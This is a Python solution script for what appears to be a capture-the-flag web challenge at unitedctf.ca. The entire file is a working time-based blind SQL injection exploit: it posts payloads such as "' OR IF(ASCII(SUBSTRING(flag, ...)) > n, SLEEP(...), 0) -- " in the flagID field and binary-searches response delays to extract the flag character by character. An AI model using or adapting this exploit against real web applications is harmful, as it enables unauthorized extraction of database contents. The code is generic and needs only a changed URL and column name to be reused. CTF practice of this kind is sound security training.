#!/usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
from datetime import timedelta

URL = "https://unitedctf.ca:18000/challenge4.php"
HEADERS = {}
SLEEP_SECONDS = 0.3 # Sleep for 0.3 second. Adjust duration for your connection speed so you can differentiate responses.

query = "' OR IF(ASCII(SUBSTRING(flag, {}, 1)) > {}, SLEEP(" + str(SLEEP_SECONDS) + "), 0) -- " # Placeholders are for Position and ascii value respectively
validate = "' OR IF(flag='{}', SLEEP(" + str(SLEEP_SECONDS) + "), 0) -- "

def find_next_letter(index):
    resp = requests.Response()
    low = 0
    high = 0x7f # Maximum value in ASCII range

    # Use binary search over the ASCII range. Faster than enumerating each character
    while high > low:
        char = (low + high) // 2
        try:
            resp = requests.post(URL, data={"flagID": query.format(index, char)}, headers=HEADERS)
        except ConnectionError as e:
            print(e)
        if resp.elapsed > timedelta(seconds=SLEEP_SECONDS):
            low = char + 1
        else:
            high = char
    return chr(low)

def find_password():
    currentPass = ""
    while requests.post(URL, data={"flagID": validate.format(currentPass)}, headers=HEADERS).elapsed < timedelta(seconds=SLEEP_SECONDS):
        currentPass += find_next_letter(len(currentPass) + 1) #SUBSTRING is 1-indexed
        print(currentPass)
    return currentPass

print("Flag: " + find_password())
